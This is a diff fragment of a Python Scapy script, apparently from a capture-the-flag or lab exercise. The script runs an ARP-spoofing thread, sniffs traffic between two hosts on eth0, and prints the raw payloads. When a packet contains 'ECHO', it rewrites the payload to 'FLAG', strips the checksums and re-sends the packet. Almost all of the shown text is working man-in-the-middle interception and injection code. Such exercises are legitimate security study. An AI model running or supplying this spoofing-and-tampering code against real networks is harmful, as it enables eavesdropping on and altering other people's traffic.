@@ -514,7 +514,6 @@ def process_packet(packet):
 			if packet.haslayer(Raw):
 				data = packet[Raw].load
 				print(data)
-			send(packet,iface="eth0")
 		else :
 			if ip_src == ip2 and ip_dst ==ip1:
 				#print("{ip2} to {ip1}")
@@ -523,20 +522,15 @@ def process_packet(packet):
 					print(data)
 					if b"ECHO" in data:
 						print("hit!!!!!!!!!!!!!!!!!----------------------++++++++++++++++++")
+						packet.show()
 						packet[Raw].load = b"FLAG\n"
 						del packet[IP].chksum
 						del packet[TCP].chksum
-						
-						send(packet,iface="eth0")
-						print("send!")	
-						packet.show()
-				send(packet,iface="eth0")
-							
-	else:
-		send(packet,iface="eth0")
+						packet.show2()
+						sendp(packet,iface="eth0")
 
 arp_thread=threading.Thread(target=arp_spoof)
 arp_thread.start()
 
-sniff(prn=process_packet,iface="eth0",store=0)
+sniff(prn=process_packet,iface="eth0")
 ```
